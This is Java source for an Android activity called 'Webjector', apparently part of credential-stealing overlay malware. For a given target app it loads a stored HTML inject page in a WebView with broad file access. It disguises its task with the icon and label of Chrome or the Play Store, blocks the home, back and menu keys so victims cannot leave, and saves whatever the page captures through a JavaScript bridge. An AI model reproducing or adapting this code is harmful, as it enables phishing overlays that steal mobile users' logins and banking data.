package com.icontrol.protector;


import static com.icontrol.protector.UtliTools.drawableToBitmap;
import static com.icontrol.protector.UtliTools.isPackageInstalled;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;

import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;

import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;


import org.json.JSONObject;


import java.io.File;
import java.net.URI;

public class Webjector extends Activity {
    WebView mWebView;
    String current_id;
    Context myctx;
    AppDataManager manager;

    @Override
    public void onBackPressed() {
        try {
            if (mWebView != null && mWebView.canGoBack()) {
                mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (NullPointerException s) {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
        return paramInt == KeyEvent.KEYCODE_HOME ||
                paramInt == KeyEvent.KEYCODE_BACK ||
                paramInt == KeyEvent.KEYCODE_MENU;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        myctx = getApplicationContext();
        flaged=false;
        manager = new AppDataManager(getApplicationContext());
        Intent intent = getIntent();
        //String value = "";
        String CuzPackage = "";
        try {
           // value = intent.getStringExtra("key");
            CuzPackage = intent.getStringExtra("cuzid");
            current_id=CuzPackage;
        } catch (Exception e) {
            finish();
            return;
        }

        try
        {
            if(intent.hasExtra("icon")){
                String label = intent.getStringExtra("label");
                setTitle(label);

                byte[] iconByteArray = intent.getByteArrayExtra("icon");
                Bitmap iconBitmap = BitmapFactory.decodeByteArray(iconByteArray, 0, iconByteArray.length);
                ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(label, iconBitmap);
                setTaskDescription(taskDescription);

            }else{
                String packageName = "com.android.chrome";

                if(!isPackageInstalled(packageName,getPackageManager())){
                    packageName = "com.android.vending";
                    if(!isPackageInstalled(packageName,getPackageManager())){
                        packageName = UtliTools.getRandomLauncherApp(getApplicationContext());
                        if(!isPackageInstalled(packageName,getPackageManager())){
                            packageName = null;
                        }
                    }
                }
                if(packageName != null){
                    PackageManager packageManager = getPackageManager();
                    ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                    Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);
                    String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                    setTitle(appName);
                    Bitmap appIconBitmap = drawableToBitmap(appIcon);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(" ", appIconBitmap);
                        setTaskDescription(taskDescription);
                    }
                }
            }

        }catch (Exception a){}

        try {
            //WebView mWebView = new WebView((Context)this);
            mWebView = new WebView(this);
            mWebView.getSettings().setJavaScriptEnabled(true);

            mWebView.addJavascriptInterface(new WebAppInterface(this), "Android");

            mWebView.getSettings().setLoadsImagesAutomatically(true);
            mWebView.getSettings().setLoadWithOverviewMode(true);
            try{
                CookieManager.getInstance().setAcceptCookie(true);
                CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
            }catch (Exception a){

            }
            mWebView.getSettings().setUseWideViewPort(true);
            mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            mWebView.getSettings().setAllowFileAccess(true);
            mWebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            mWebView.getSettings().setDomStorageEnabled(true);
            mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
            mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
            mWebView.getSettings().setAllowContentAccess(true);
            try {
                mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
                mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                mWebView.setBackgroundColor(0xffffffff);
            } catch (Exception a) {
            }

            mWebView.getSettings().setBuiltInZoomControls(false);
            String ua = mWebView.getSettings().getUserAgentString();
            mWebView.getSettings().setUserAgentString(ua);
            mWebView.setWebChromeClient(new Webjector.MyChrome());
            mWebView.setWebViewClient(new Webjector.MyWebViewClient());

            String htmlpath  = UtliTools.findjectfile(getApplicationContext(),CuzPackage);
            File htmlFile = new File(this.getFilesDir(), htmlpath);
            if (htmlFile.exists()) {
                mWebView.loadUrl("file://" + htmlFile.getAbsolutePath());
                setContentView((View) mWebView);

            }else{
                finish();
            }

        } catch (Exception exception) {
        }
    }


    public class MyChrome extends WebChromeClient {
        MyChrome() {
        }
        @Override
        public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
            String logmsg = consoleMessage.message();
           try{
               if(logmsg.startsWith("print event:")){
                   //current_id
                   AccessServices.skipject=current_id;
                   manager.addData(current_id, logmsg);
                   finish();
               }
//               JSONObject jsonObject = new JSONObject();
//               jsonObject.put("type", "blog");
//               jsonObject.put("data", logmsg);
//               String jsonData = jsonObject.toString();
//
//               LiveChat.Livemessage(myctx,jsonData);
           }catch (Exception a){}


            return true;
        }
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }

        @JavascriptInterface
        public void returnResult(String logmsg) {
            // Handle the result from JavaScript (e.g., log or process JSON)

            try{
               // if(logmsg.startsWith("print event:")){
                    //current_id
                    AccessServices.skipject=current_id;
                    manager.addData(current_id, logmsg);
                    finish();
               // }
//               JSONObject jsonObject = new JSONObject();
//               jsonObject.put("type", "blog");
//               jsonObject.put("data", logmsg);
//               String jsonData = jsonObject.toString();
//
//               LiveChat.Livemessage(myctx,jsonData);
            }catch (Exception a){}
        }
    }


    private boolean flaged =false;


    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    @Override
    protected void onStop() {
        super.onStop();
    }

    private class MyWebChromeClient extends WebChromeClient {
        private MyWebChromeClient() {
        }

        public boolean onJsAlert(WebView param1WebView, String param1String1, String param1String2, JsResult param1JsResult) {
            return true;
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            // TODO Auto-generated method stub

            if (request != null && request.getUrl() != null) {
                String url = request.getUrl().toString();
                if (!url.startsWith("http") && url.contains("://")) {
                    try {

                        URI uri = new URI(url);
                        String newUrl = uri.getHost() + uri.getPath();

                        view.loadUrl(newUrl);
                        return true; // URL handled
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }


            return false;

        }

        @Override
        public void onReceivedError(WebView view, int errorCode,
                                    String description, String failingUrl) {

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub

            super.onPageFinished(view, url);

        }


    }



}
